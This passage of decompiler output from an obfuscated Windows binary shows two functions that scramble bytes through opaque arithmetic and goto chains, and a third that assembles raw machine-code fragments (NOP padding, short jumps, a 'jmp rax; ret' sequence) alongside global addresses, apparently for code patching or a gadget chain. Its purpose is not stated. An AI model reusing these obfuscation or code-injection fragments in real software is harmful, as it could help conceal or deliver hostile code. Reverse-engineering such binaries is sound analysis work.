          local_res8 = bVar2 + (cVar4 + 0xb2U & bVar2) * -2 + -0x2c + cVar4;
          uVar9 = uVar8;
          goto LAB_140007e45;
        }
        if (uVar1 < uVar9 + 0x3f6) {
          local_res8 = bVar2 + (cVar4 + 0x2eU & bVar2) * -2 + -0x14 + cVar4;
          uVar9 = uVar8;
          goto LAB_140007eb7;
        }
        if (uVar1 < uVar9 + 0x418) break;
        if (uVar1 < uVar9 + 0x3f2) {
          cVar7 = ('\x0e' - (cVar4 + 0x26U & bVar2)) * '\x02' + bVar2;
          uVar9 = uVar8;
          goto LAB_140008312;
        }
        if (uVar1 < uVar9 + 0x3f9) {
          bVar10 = cVar4 + 0xa2;
          cVar7 = '\x1a';
          uVar9 = uVar8;
          goto LAB_1400082c4;
        }
        if (uVar1 < uVar9 + 0x432) {
          cVar7 = ('&' - (cVar4 + 0x1eU & bVar2)) * '\x02' + bVar2;
          uVar9 = uVar8;
          goto LAB_140008290;
        }
        if (uVar1 < uVar9 + 0x13f0) {
          local_res8 = ('2' - (cVar4 + 0x9aU & bVar2)) * '\x02' + bVar2 + cVar4;
          uVar9 = uVar8;
          goto LAB_14000826f;
        }
        if (uVar9 + 0x3f1 <= uVar1) {
          uVar3 = uVar9 + 0x451;
          uVar8 = uVar9 + 0x459;
          if (uVar9 + 0x45b < uVar3) {
            local_res8 = ('\x10' - (cVar4 - 0x30U & bVar2)) * '\x02' + bVar2 + cVar4;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar8 + 1;
            uVar9 = uVar8;
            goto LAB_140007e32;
          }
          if (uVar9 + 0x462 < uVar3) {
            local_res8 = ('\x1c' - (cVar4 + 0x4cU & bVar2)) * '\x02' + bVar2 + cVar4;
            uVar9 = uVar8;
            goto LAB_140008886;
          }
          if (uVar9 + 0x49b < uVar3) {
            local_res8 = ('(' - (cVar4 - 0x38U & bVar2)) * '\x02' + bVar2 + cVar4;
            uVar9 = uVar8;
            goto LAB_14000885f;
          }
          if (uVar9 + 0x1459 < uVar3) {
            local_res8 = ('4' - (cVar4 + 0x44U & bVar2)) * '\x02' + bVar2 + cVar4;
            uVar9 = uVar8;
            goto LAB_14000882c;
          }
          if (uVar9 + 0x45a < uVar3) {
            local_res8 = cVar4 + bVar2 + (cVar4 - 0x40U & bVar2) * -2 + 0x80;
            uVar3 = uVar3 + uVar8;
            uVar9 = uVar8;
            goto LAB_14000882c;
          }
          if (uVar9 + 0x461 < uVar3) {
            local_res8 = bVar2 + (cVar4 + 0x3cU & bVar2) * -2 + -0x68 + cVar4;
            uVar9 = uVar8;
            goto LAB_1400087f1;
          }
          if (uVar9 + 0x4d3 < uVar3) {
            local_res8 = cVar4 + bVar2 + (cVar4 + 0xb8U & bVar2) * -2 + 0xb0;
            uVar9 = uVar8;
            goto LAB_140007e32;
          }
          if (uVar9 + 0x45c < uVar3) {
            local_res8 = (cVar4 + bVar2 + (cVar4 + 0x34U & bVar2) * -2) - 0x38;
            uVar9 = uVar9 + 0x45a;
            goto LAB_140007e32;
          }
          if (uVar9 + 0x463 < uVar3) {
            cVar7 = bVar2 + (cVar4 + 0xb0U & bVar2) * -2 + -0x20;
            uVar9 = uVar8;
            goto LAB_14000878a;
          }
          if (uVar3 <= uVar9 + 0x4bd) {
            uVar3 = uVar9 + 0x45a;
            uVar8 = uVar9 + 0x4bb;
          }
        }
      }
      local_res8 = ('\x02' - (cVar4 + 0xaaU & bVar2)) * '\x02' + bVar2 + cVar4;
      uVar9 = uVar8;
    }
    if (uVar3 < uVar9 + 0x42) {
      cVar7 = bVar2 + (cVar4 + 0x3eU & bVar2) * -2 + -0x74;
LAB_140008312:
      local_res8 = cVar7 + cVar4;
LAB_140008315:
      if (uVar9 + uVar3 == 0x7a) {
        local_res8 = (cVar4 + 0xacU & bVar2) * -2 + -8 + cVar4;
LAB_14000885f:
        bVar10 = (cVar4 - 0x16U) + (cVar4 - 0x16U & bVar2) * -2 + -0x66 + bVar2;
        *(byte *)((longlong)&local_28 + uVar5) = bVar10;
        uVar5 = uVar5 - ((ulonglong)bVar10 + uVar9 + 1);
        uVar9 = uVar9 + 1;
LAB_140008886:
        bVar10 = (char)uVar5 + 0x28;
        uVar3 = uVar3 + 1;
        *(byte *)((longlong)&local_28 + uVar5) = bVar2 + (bVar2 & bVar10) * -2 + -0x18 + bVar10;
        lVar6 = uVar5 + (-1 - uVar3);
        uVar5 = lVar6 + (&bStack_29)[lVar6 + 1] + uVar9 + 1;
        goto LAB_140007e32;
      }
      if (uVar9 + 9 < uVar3) {
        bVar10 = cVar4 - 0x3a;
        cVar7 = '.';
LAB_1400082c4:
        local_res8 = (cVar7 - (bVar10 & bVar2)) * '\x02' + bVar2 + cVar4;
LAB_1400082d0:
        if (uVar3 < 0x20) {
          if (uVar9 + 0x7a < uVar3) {
            cVar7 = bVar2 + (cVar4 - 0x24U & bVar2) * -2 + -0x28;
LAB_140008290:
            local_res8 = cVar7 + cVar4;
LAB_140008293:
            if (0x29 < uVar9) {
              local_res8 = (bVar2 + (cVar4 + 0xb4U & bVar2) * -2 + cVar4) * '\x02' + 0x90;
              goto LAB_14000878d;
            }
LAB_14000826f:
            *(byte *)((longlong)&local_28 + uVar5) = local_res8;
            uVar5 = uVar5 + 1;
            goto LAB_140007e32;
          }
          if (uVar3 == uVar9 + 1) {
            local_res8 = (cVar4 + bVar2 + (cVar4 + 0x58U & bVar2) * -2) - 0x10;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar9 + 1;
            goto LAB_140007e32;
          }
          if (uVar3 == uVar9 + 2) {
            local_res8 = ('\x1c' - (cVar4 - 0x34U & bVar2)) * '\x02' + bVar2 + cVar4;
            goto LAB_14000882c;
          }
          if (uVar3 != uVar9 + 3) {
            if (uVar3 != uVar9 + 5) {
              if (uVar3 == uVar9 + 8) {
                cVar7 = bVar2 + (cVar4 + 0x38U & bVar2) * -2 + -0x50;
                goto LAB_14000878a;
              }
              goto LAB_140008293;
            }
            uVar9 = uVar9 + 1;
            local_res8 = cVar4 + bVar2 + (cVar4 + 0xbcU & bVar2) * -2 + 0x98;
            goto LAB_140007e32;
          }
          local_res8 = ('(' - (cVar4 + 0x48U & bVar2)) * '\x02' + bVar2 + cVar4;
          uVar3 = uVar3 + uVar9;
        }
        else {
          local_res8 = bVar2 * '\x02' + (cVar4 + 0x30U & bVar2) * -2 + -0x20 + cVar4;
LAB_1400087f1:
          *(byte *)((longlong)&local_28 + uVar5) =
               cVar4 + 0x6eU + (cVar4 + 0x6eU & bVar2) * -2 + -2 + bVar2 + local_res8;
          uVar3 = uVar3 + uVar9;
        }
      }
      else {
        if (uVar3 == uVar9 + 1) {
          bVar10 = cVar4 + 0x42;
          cVar7 = ':';
LAB_14000877e:
          cVar7 = (cVar7 - (bVar10 & bVar2)) * '\x02' + bVar2;
LAB_14000878a:
          local_res8 = cVar7 + cVar4;
LAB_14000878d:
          *(byte *)((longlong)&local_28 + uVar5) =
               ('1' - (cVar4 - 0xeU & bVar2)) * '\x02' + (cVar4 - 0xeU) + bVar2;
          uVar9 = uVar9 + 1;
          goto LAB_140007e32;
        }
        if (uVar3 == uVar9 + 2) {
          local_res8 = cVar4 + bVar2 + (cVar4 + 0x3aU & bVar2) * -2 + 0xa4;
          goto LAB_140007e32;
        }
        if (uVar3 == uVar9 + 3) {
          local_res8 = (cVar4 + bVar2 + (cVar4 + 0x32U & bVar2) * -2) - 0x2c;
          uVar3 = uVar3 + uVar9;
        }
        else {
          if (uVar3 != uVar9 + 4) {
            if (uVar3 == uVar9 + 5) {
              local_res8 = ('\x0e' - (cVar4 + 0xa6U & bVar2)) * '\x02' + bVar2 + cVar4;
              goto LAB_140008886;
            }
            if (uVar3 != uVar9 + 6) goto LAB_1400082d0;
            local_res8 = ('\x1a' - (cVar4 + 0x22U & bVar2)) * '\x02' + bVar2 + cVar4;
            uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar9 + 1;
            goto LAB_140007e32;
          }
          local_res8 = (cVar4 + bVar2 + (cVar4 + 0xaeU & bVar2) * -2) - 0x14;
        }
      }
LAB_14000882c:
      uVar5 = uVar5 - local_res8;
      goto LAB_140007e32;
    }
    if (uVar3 != uVar9 + 1) {
      if (uVar3 != uVar9 + 2) {
        if (uVar3 == uVar9 + 3) {
          local_res8 = (' ' - (cVar4 + 0xa0U & bVar2)) * '\x02' + bVar2 + cVar4;
        }
        else {
          if (uVar3 != uVar9 + 5) goto LAB_140008315;
          local_res8 = (',' - (cVar4 + 0x1cU & bVar2)) * '\x02' + bVar2 + cVar4;
          uVar3 = uVar3 + uVar9;
        }
        goto LAB_14000882c;
      }
      local_res8 = ('\x14' - (cVar4 + 0x24U & bVar2)) * '\x02' + bVar2 + cVar4;
      goto LAB_14000885f;
    }
    local_res8 = (cVar4 + bVar2 + (cVar4 + 0x2cU & bVar2) * -2) - 8;
    uVar5 = uVar5 + *(byte *)((longlong)&local_28 + uVar5) + uVar9 + 1;
  } while( true );
}



/* ==================================================================== */
/* FUN_140008950 @ 140008950 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_140008950(void)

{
  ulonglong uVar1;
  byte bVar2;
  ulonglong uVar3;
  byte bVar4;
  byte bVar5;
  ulonglong uVar6;
  longlong lVar7;
  char cVar8;
  ulonglong uVar9;
  ulonglong uVar10;
  byte local_res8;
  int in_stack_00a45da8;
  int in_stack_014b5e98;
  byte bStack_29;
  int local_28;
  undefined8 local_24;
  undefined8 uStack_1c;
  undefined8 local_14;
  undefined4 local_c;

  local_24 = 0;
  uStack_1c = 0;
  local_14 = 0;
  local_c = 0;
  local_28 = 0x63472cd5;
LAB_140008992:
  uVar3 = DAT_140a618c8;
  uVar10 = DAT_140a618d0;
LAB_1400089a0:
  uVar6 = 0;
  uVar9 = uVar10;
LAB_1400089a2:
  if (0x1f < uVar6) {
    _DAT_140a61900 = (longlong)local_28;
    return;
  }
  bVar2 = *(byte *)((longlong)&local_28 + uVar6);
  bVar5 = (byte)uVar6;
LAB_1400089b5:
  if (uVar6 < uVar3) {
    _DAT_140a61900 = (longlong)in_stack_00a45da8;
    return;
  }
  if (uVar9 + 1 <= uVar3) {
    if (uVar3 == uVar9 + 1) {
      local_res8 = bVar2 + bVar5 + 0x30 + (bVar5 + 0x30 & bVar2) * -2 + 0xb0;
      uVar6 = uVar6 + *(byte *)((longlong)&local_28 + uVar6) + uVar9 + 1;
    }
    else {
      if (uVar3 == uVar9 + 2) {
        local_res8 = (bVar2 + bVar5 + 0x70 + (bVar5 + 0x70 & bVar2) * -2) - 0x10;
        goto LAB_1400092ad;
      }
      if (uVar3 == uVar9 + 3) {
        local_res8 = ('\x18' - (bVar2 & bVar5 + 0xb0)) * '\x02' + bVar2 + bVar5 + 0xb0;
        goto LAB_14000927b;
      }
      if (uVar3 == uVar9 + 5) {
        local_res8 = (bVar5 - 0x30) + ('(' - (bVar5 - 0x30 & bVar2)) * '\x02' + bVar2;
        goto LAB_140009243;
      }
      if (uVar3 != uVar9 + 7) goto LAB_140008a1a;
      bVar4 = bVar5 - 0x10;
      cVar8 = '0';
LAB_14000920b:
      local_res8 = (cVar8 - (bVar4 & bVar2)) * '\x02' + bVar2 + bVar5;
    }
    goto LAB_1400089a2;
  }
  local_res8 = bVar5 + (bVar5 + 0x10 & bVar2) * -2 + -0x60 + bVar2;
LAB_140008a1a:
  uVar10 = uVar9;
LAB_140008a20:
  if (uVar6 < uVar10) {
    _DAT_140a61900 = (longlong)in_stack_014b5e98;
    return;
  }
  uVar9 = uVar10;
  if (uVar10 + 0x80 <= uVar3) {
    if (uVar3 == uVar10 + 1) {
      bVar4 = bVar5 + 0x70;
      goto LAB_1400091c5;
    }
    if (uVar3 != uVar10 + 2) {
      if (uVar3 != uVar10 + 3) {
        if (uVar3 != uVar10 + 5) goto LAB_140008a90;
        bVar4 = bVar5 + 0x10;
        goto LAB_14000916f;
      }
      bVar4 = bVar5 + 0xb0;
      goto LAB_140009188;
    }
    uVar9 = uVar10 + 1;
    local_res8 = bVar5 + bVar2 + (bVar5 + 0x90 & bVar2) * -2 + 0xa0;
    goto LAB_1400089a2;
  }
  local_res8 = ('\x10' - (bVar5 + 0x50 & bVar2)) * '\x02' + bVar5 + bVar2;
LAB_140008a90:
  while (uVar10 = uVar9, uVar6 < uVar9 + uVar3) {
    while( true ) {
      do {
        uVar9 = uVar10;
        uVar1 = uVar9 + 0x200;
        if (uVar3 == uVar1) {
          cVar8 = bVar2 + (bVar5 - 0x20 & bVar2) * -2 + -0x40;
          goto LAB_1400091d6;
        }
        if (uVar3 == uVar9 + 6) {
          uVar9 = uVar9 + 1;
          local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
          goto LAB_1400089a2;
        }
        if (uVar3 == uVar9 + 0x1000) {
          bVar4 = bVar5 + 0x20;
          cVar8 = ' ';
          goto LAB_14000920b;
        }
        if (uVar3 == uVar9 + 10) goto LAB_140008fe4;
        if (uVar3 == uVar9 + 0x41) {
          local_res8 = (bVar5 + bVar2 + (bVar5 + 0x60 & bVar2) * -2) - 0x40;
          goto LAB_14000927b;
        }
        if (uVar3 == uVar9 + 0x28) {
          local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
          goto LAB_14000927e;
        }
        if (uVar3 == uVar9 + 0x10) {
          local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar5;
          goto LAB_1400092ad;
        }
        uVar10 = uVar9;
        if (uVar3 == uVar9 + 0x5a) goto LAB_140008f9a;
        if (uVar3 == uVar9 + 0x40) {
          local_res8 = (bVar5 + bVar2 + (bVar5 - 0x20 & bVar2) * -2) - 0x40;
          uVar6 = uVar6 + *(byte *)((longlong)&local_28 + uVar6) + uVar9 + 1;
          goto LAB_1400089a2;
        }
      } while (uVar3 == uVar9 + 2);
      uVar10 = uVar9 + 0x280;
      if (uVar1 < uVar9 + 0x286) {
        local_res8 = (bVar2 + bVar5 + (bVar5 + 0x30 & bVar2) * -2) - 0x20;
        goto LAB_140008992;
      }
      uVar3 = uVar1;
      if (uVar1 < uVar9 + 0x284) {
        local_res8 = ('\x10' - (bVar5 + 0x50 & bVar2)) * '\x02' + bVar5 + bVar2;
        goto LAB_1400089a0;
      }
      if (uVar1 < uVar9 + 0x668) {
        local_res8 = ('0' - (bVar5 + 0x70 & bVar2)) * '\x02' + bVar2 + bVar5;
        uVar9 = uVar10;
        goto LAB_1400089b5;
      }
      if (uVar1 < uVar9 + 0x288) {
        local_res8 = bVar2 + (bVar2 & bVar5 + 0x90) * -2 + -0x60 + bVar5;
        goto LAB_140008a20;
      }
      if (uVar1 < uVar9 + 0x2e1) break;
      if (uVar1 < uVar9 + 0x290) {
        cVar8 = ('\x10' - (bVar5 - 0x30 & bVar2)) * '\x02' + bVar2;
        uVar9 = uVar10;
        goto LAB_140008e5a;
      }
      if (uVar1 < uVar9 + 0x2da) {
        bVar4 = bVar5 - 0x10;
        cVar8 = '0';
        uVar9 = uVar10;
        goto LAB_140008e0b;
      }
      if (uVar1 < uVar9 + 0x2c0) {
        cVar8 = bVar2 + (bVar5 + 0x10 & bVar2) * -2 + -0x60;
        uVar9 = uVar10;
        goto LAB_140008dd7;
      }
      if (uVar1 < uVar9 + 0x282) {
        local_res8 = (bVar5 + bVar2 + (bVar5 + 0x30 & bVar2) * -2) - 0x20;
        uVar9 = uVar10;
        goto LAB_140008db7;
      }
      if (uVar9 + 0x300 <= uVar1) {
        uVar3 = uVar9 + 0x2e4;
        uVar10 = uVar9 + 0x2e9;
        if (uVar9 + 0x2ed < uVar3) {
          uVar6 = uVar6 + *(byte *)((longlong)&local_28 + uVar6) + uVar10 + 1;
          local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
          uVar9 = uVar10;
          goto LAB_1400089a2;
        }
        if (uVar9 + 0x6d1 < uVar3) {
          local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar5;
          goto LAB_1400092d6;
        }
        if (uVar9 + 0x2f1 < uVar3) {
          local_res8 = bVar2 + (bVar5 - 0x40 & bVar2) * -2 + -0x80 + bVar5;
          uVar9 = uVar10;
          goto LAB_1400092ad;
        }
        if (uVar9 + 0x34a < uVar3) {
          local_res8 = (bVar5 + bVar2 + (bVar5 - 0x20 & bVar2) * -2) - 0x40;
          uVar9 = uVar10;
          goto LAB_14000927e;
        }
        if (uVar9 + 0x2f9 < uVar3) {
          local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
          uVar9 = uVar10;
          goto LAB_14000927b;
        }
        if (uVar9 + 0x343 < uVar3) {
          local_res8 = (' ' - (bVar5 + 0x20 & bVar2)) * '\x02' + bVar2 + bVar5;
          uVar9 = uVar10;
          goto LAB_140009243;
        }
        if (uVar9 + 0x329 < uVar3) {
          local_res8 = bVar5 + bVar2 + (bVar5 + 0x40 & bVar2) * -2 + 0x80;
          uVar9 = uVar10;
          goto LAB_1400089a2;
        }
        if (uVar9 + 0x309 < uVar3) {
          local_res8 = (bVar5 + bVar2 + (bVar5 + 0x60 & bVar2) * -2) - 0x40;
          uVar9 = uVar9 + 0x2ea;
          goto LAB_1400089a2;
        }
        if (uVar9 + 0x313 < uVar3) {
          cVar8 = bVar2 + (bVar2 & bVar5) * -2;
          uVar9 = uVar10;
          goto LAB_1400091d6;
        }
        if (uVar3 <= uVar9 + 0x32b) {
          uVar3 = uVar9 + 0x2ed;
          uVar10 = uVar9 + 0x2f0;
        }
      }
    }
    local_res8 = bVar2 + (bVar5 + 0xb0 & bVar2) * -2 + -0x20 + bVar5;
    uVar9 = uVar10;
  }
  if (uVar9 + 100 <= uVar3) {
    if (uVar3 == uVar9 + 1) {
      local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar2 + bVar5;
      uVar6 = uVar6 + *(byte *)((longlong)&local_28 + uVar6) + uVar9 + 1;
    }
    else {
      if (uVar3 == uVar9 + 2) {
LAB_140008f9a:
        local_res8 = bVar2 + (bVar5 - 0x40 & bVar2) * -2 + -0x80 + bVar5;
        goto LAB_1400092d6;
      }
      if (uVar3 == uVar9 + 3) {
        local_res8 = bVar2 + (bVar5 - 0x20 & bVar2) * -2 + -0x40 + bVar5;
        goto LAB_1400092ad;
      }
      if (uVar3 != uVar9 + 5) {
        if (uVar3 != uVar9 + 8) goto LAB_140008e5d;
        bVar4 = bVar5 + 0xa0;
        cVar8 = ' ';
        goto LAB_1400091ca;
      }
LAB_140008fe4:
      local_res8 = bVar2 + (bVar5 + 0x40 & bVar2) * -2 + -0x80 + bVar5;
LAB_140009243:
      *(byte *)((longlong)&local_28 + uVar6) =
           ('\b' - (bVar5 + 0x90 & bVar2)) * '\x02' + bVar5 + 0x90 + bVar2 + local_res8;
LAB_14000927b:
      uVar3 = uVar3 + uVar9;
LAB_14000927e:
      uVar6 = uVar6 - local_res8;
    }
    goto LAB_1400089a2;
  }
  cVar8 = bVar2 + (bVar5 + 0x10 & bVar2) * -2 + -0x60;
LAB_140008e5a:
  local_res8 = cVar8 + bVar5;
LAB_140008e5d:
  if (uVar9 + uVar3 == 0x5a) {
    local_res8 = (' ' - (bVar5 + 0xa0 & bVar2)) * '\x02' + bVar5;
LAB_1400092ad:
    uVar10 = uVar9 + 1;
    bVar5 = ('\x18' - (bVar2 & bVar5 + 0xb0)) * '\x02' + bVar2 + bVar5 + 0xb0;
    *(byte *)((longlong)&local_28 + uVar6) = bVar5;
    uVar6 = uVar6 - (bVar5 + uVar10);
LAB_1400092d6:
    bVar5 = (char)uVar6 - 0x40;
    uVar3 = uVar3 + 1;
    *(byte *)((longlong)&local_28 + uVar6) = bVar2 + (bVar2 & bVar5) * -2 + -0x40 + bVar5;
    lVar7 = uVar6 + (-1 - uVar3);
    uVar6 = lVar7 + (&bStack_29)[lVar7 + 1] + uVar10 + 1;
    uVar9 = uVar10;
    goto LAB_1400089a2;
  }
  if (uVar9 + 0x42 < uVar3) {
    bVar4 = bVar5 - 0x30;
    cVar8 = '\x10';
LAB_140008e0b:
    local_res8 = (cVar8 - (bVar4 & bVar2)) * '\x02' + bVar2 + bVar5;
LAB_140008e17:
    if (0x3f < uVar3) {
      local_res8 = bVar2 * '\x02' + (bVar2 & bVar5) * -2 + bVar5;
      goto LAB_140009243;
    }
    if (uVar9 + 0x28 < uVar3) {
      cVar8 = (' ' - (bVar5 + 0x20 & bVar2)) * '\x02' + bVar2;
LAB_140008dd7:
      local_res8 = cVar8 + bVar5;
    }
    else {
      if (uVar3 == uVar9 + 1) {
        local_res8 = bVar5 + bVar2 + (bVar5 + 0x40 & bVar2) * -2 + 0x80;
        uVar6 = uVar6 + *(byte *)((longlong)&local_28 + uVar6) + uVar9 + 1;
        goto LAB_1400089a2;
      }
      if (uVar3 == uVar9 + 2) {
        local_res8 = bVar2 + (bVar2 & bVar5) * -2 + bVar5;
        goto LAB_1400092ad;
      }
      if (uVar3 == uVar9 + 4) {
        local_res8 = bVar5 + bVar2 + (bVar5 - 0x40 & bVar2) * -2 + 0x80;
        goto LAB_14000927b;
      }
      if (uVar3 == uVar9 + 3) {
        local_res8 = bVar5 + bVar2 + (bVar2 & bVar5) * -2;
        goto LAB_1400089a2;
      }
      if (uVar3 == uVar9 + 6) {
        cVar8 = bVar2 + (bVar5 + 0x40 & bVar2) * -2 + -0x80;
        goto LAB_1400091d6;
      }
    }
    if (uVar9 < 0x20) {
LAB_140008db7:
      *(byte *)((longlong)&local_28 + uVar6) = local_res8;
      uVar6 = uVar6 + 1;
      goto LAB_1400089a2;
    }
    local_res8 = (bVar2 + (bVar5 + 0x60 & bVar2) * -2 + bVar5) * '\x02' + 0x80;
  }
  else {
    if (uVar3 != uVar9 + 1) {
      if (uVar3 != uVar9 + 2) {
        if (uVar3 != uVar9 + 3) {
          if (uVar3 == uVar9 + 7) {
            local_res8 = bVar2 + (bVar5 + 0xb0 & bVar2) * -2 + -0x20 + bVar5;
            goto LAB_1400092ad;
          }
          goto LAB_140008e17;
        }
        bVar4 = bVar5 + 0x90;
LAB_14000916f:
        local_res8 = bVar5 + bVar2 + (bVar4 & bVar2) * -2 + 0xa0;
        goto LAB_14000927e;
      }
      bVar4 = bVar5 + 0x30;
LAB_140009188:
      local_res8 = (bVar5 + bVar2 + (bVar4 & bVar2) * -2) - 0x20;
      goto LAB_1400089a2;
    }
    bVar4 = bVar5 - 0x10;
    uVar10 = uVar9;
LAB_1400091c5:
    cVar8 = '0';
    uVar9 = uVar10;
LAB_1400091ca:
    cVar8 = (cVar8 - (bVar4 & bVar2)) * '\x02' + bVar2;
LAB_1400091d6:
    local_res8 = cVar8 + bVar5;
  }
  *(byte *)((longlong)&local_28 + uVar6) =
       bVar5 + 0x70 + (bVar5 + 0x70 & bVar2) * -2 + -0x10 + bVar2;
  uVar9 = uVar9 + 1;
  goto LAB_1400089a2;
}



/* ==================================================================== */
/* FUN_1400093b0 @ 1400093b0 */

/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

void FUN_1400093b0(void)

{
  longlong lVar1;
  undefined8 uVar2;
  void *pvVar3;
  ulonglong uVar4;
  size_t sVar5;
  undefined8 **ppuVar6;
  undefined2 local_res18;
  undefined1 local_res1a;
  undefined2 local_res20;
  undefined1 local_res22;
  undefined2 local_318;
  undefined1 local_316;
  undefined4 local_314;
  undefined1 local_310;
  undefined4 local_30c;
  undefined2 local_308;
  undefined4 local_304;
  undefined2 local_300;
  undefined4 local_2fc;
  undefined2 local_2f8;
  undefined4 local_2f0;
  undefined4 local_2ec;
  undefined2 local_2e8;
  longlong local_2e0;
  longlong lStack_2d8;
  undefined8 *local_2d0;
  undefined8 *local_2c8;
  undefined8 *puStack_2c0;
  undefined8 *local_2b8;
  undefined2 *local_2b0;
  undefined2 *local_2a8;
  undefined2 *puStack_2a0;
  undefined8 *local_298;
  undefined8 *puStack_290;
  undefined8 *local_288;
  void *local_280;
  void *local_278;
  longlong lStack_270;
  void *local_268;
  void *pvStack_260;
  void *local_258;
  void *local_250;
  void *local_248;
  longlong lStack_240;
  void *local_238;
  void *pvStack_230;
  void *local_228;
  undefined1 *local_220;
  undefined1 *local_218;
  undefined1 *puStack_210;
  undefined8 *local_208;
  undefined8 *puStack_200;
  undefined8 *local_1f8;
  void *local_1f0;
  void *local_1e8;
  longlong lStack_1e0;
  undefined8 *local_1d8;
  undefined8 *puStack_1d0;
  undefined8 *local_1c8;
  void *local_1c0;
  void *local_1b8;
  longlong lStack_1b0;
  undefined8 *local_1a8;
  undefined8 *puStack_1a0;
  undefined8 *local_198;
  undefined1 *local_190;
  undefined1 *local_188;
  undefined1 *puStack_180;
  undefined8 *local_178;
  undefined8 *puStack_170;
  undefined8 *local_168;
  void *local_160;
  void *local_158;
  longlong lStack_150;
  undefined8 *local_148;
  undefined8 *puStack_140;
  undefined8 *local_138;
  undefined2 *local_130;
  undefined2 *local_128;
  undefined2 *puStack_120;
  undefined8 *local_118;
  undefined8 *puStack_110;
  undefined8 *local_108;
  void *local_100;
  void *local_f8;
  longlong lStack_f0;
  undefined8 *local_e8;
  undefined8 *puStack_e0;
  undefined8 *local_d8;
  void *local_d0;
  void *local_c8;
  longlong lStack_c0;
  undefined8 *local_b8;
  undefined8 *puStack_b0;
  undefined8 *local_a8;
  void *local_a0;
  void *local_98;
  longlong lStack_90;
  undefined8 *local_88 [10];
  undefined8 *local_38;
  longlong local_30;

  uVar2 = DAT_140a61990;
  local_2c8 = (undefined8 *)0x0;
  puStack_2c0 = (undefined8 *)0x0;
  local_2b8 = (undefined8 *)0x0;
  local_2c8 = (undefined8 *)FUN_14000e6b0(8);
  puStack_2c0 = local_2c8 + 1;
  *local_2c8 = uVar2;
  local_2b0 = (undefined2 *)0x0;
  local_2a8 = (undefined2 *)0x0;
  puStack_2a0 = (undefined2 *)0x0;
  local_2b8 = puStack_2c0;
  local_2b0 = (undefined2 *)FUN_14000e6b0(2);
  local_2a8 = local_2b0 + 1;
  *local_2b0 = 0xe990;
  uVar2 = DAT_140a619a0;
  local_298 = (undefined8 *)0x0;
  puStack_290 = (undefined8 *)0x0;
  local_288 = (undefined8 *)0x0;
  puStack_2a0 = local_2a8;
  local_298 = (undefined8 *)FUN_14000e6b0(8);
  puStack_290 = local_298 + 1;
  *local_298 = uVar2;
  local_30c = 0x90909090;
  local_308 = 0x9090;
  local_280 = (void *)0x0;
  local_278 = (void *)0x0;
  lStack_270 = 0;
  local_288 = puStack_290;
  local_280 = (void *)FUN_14000e6b0(6);
  lVar1 = (longlong)local_280 + 6;
  local_278 = local_280;
  lStack_270 = lVar1;
  memmove(local_280,&local_30c,6);
  local_268 = (void *)0x0;
  pvStack_260 = (void *)0x0;
  local_258 = (void *)0x0;
  uVar4 = DAT_140a61910 - (longlong)DAT_140a61908 >> 3;
  local_278 = (void *)lVar1;
  if (uVar4 != 0) {
    if (0x1fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    pvVar3 = (void *)FUN_14000e6b0(uVar4 * 8);
    local_258 = (void *)((longlong)pvVar3 + uVar4 * 8);
    sVar5 = DAT_140a61910 - (longlong)DAT_140a61908;
    local_268 = pvVar3;
    pvStack_260 = pvVar3;
    memmove(pvVar3,DAT_140a61908,sVar5);
    pvStack_260 = (void *)((longlong)pvVar3 + ((longlong)sVar5 >> 3) * 8);
  }
  local_304 = 0x90909090;
  local_300 = 0x9090;
  local_250 = (void *)0x0;
  local_248 = (void *)0x0;
  lStack_240 = 0;
  local_250 = (void *)FUN_14000e6b0(6);
  lVar1 = (longlong)local_250 + 6;
  local_248 = local_250;
  lStack_240 = lVar1;
  memmove(local_250,&local_304,6);
  local_238 = (void *)0x0;
  pvStack_230 = (void *)0x0;
  local_228 = (void *)0x0;
  uVar4 = DAT_140a61948 - (longlong)DAT_140a61940 >> 3;
  local_248 = (void *)lVar1;
  if (uVar4 != 0) {
    if (0x1fffffffffffffff < uVar4) {
                    /* WARNING: Subroutine does not return */
      FUN_14000e380();
    }
    pvVar3 = (void *)FUN_14000e6b0(uVar4 * 8);
    local_228 = (void *)((longlong)pvVar3 + uVar4 * 8);
    sVar5 = DAT_140a61948 - (longlong)DAT_140a61940;
    local_238 = pvVar3;
    pvStack_230 = pvVar3;
    memmove(pvVar3,DAT_140a61940,sVar5);
    pvStack_230 = (void *)((longlong)pvVar3 + ((longlong)sVar5 >> 3) * 8);
  }
  local_220 = (undefined1 *)0x0;
  local_218 = (undefined1 *)0x0;
  puStack_210 = (undefined1 *)0x0;
  local_220 = (undefined1 *)FUN_14000e6b0(1);
  local_218 = local_220 + 1;
  *local_220 = 0xeb;
  uVar2 = DAT_140a61988;
  local_208 = (undefined8 *)0x0;
  puStack_200 = (undefined8 *)0x0;
  local_1f8 = (undefined8 *)0x0;
  puStack_210 = local_218;
  local_208 = (undefined8 *)FUN_14000e6b0(8);
  puStack_200 = local_208 + 1;
  *local_208 = uVar2;
  local_2f0 = 0x90c3e0ff;
  local_2ec = 0x90909090;
  local_2e8 = 0x9090;
  local_1f0 = (void *)0x0;
  local_1e8 = (void *)0x0;
  lStack_1e0 = 0;
  local_1f8 = puStack_200;
  local_1f0 = (void *)FUN_14000e6b0(10);
  lVar1 = (longlong)local_1f0 + 10;
  local_1e8 = local_1f0;
  lStack_1e0 = lVar1;
  memmove(local_1f0,&local_2f0,10);
  uVar2 = DAT_140a618f0;
  local_1d8 = (undefined8 *)0x0;
  puStack_1d0 = (undefined8 *)0x0;
  local_1c8 = (undefined8 *)0x0;
  local_1e8 = (void *)lVar1;
  local_1d8 = (undefined8 *)FUN_14000e6b0(8);
  puStack_1d0 = local_1d8 + 1;
  *local_1d8 = uVar2;
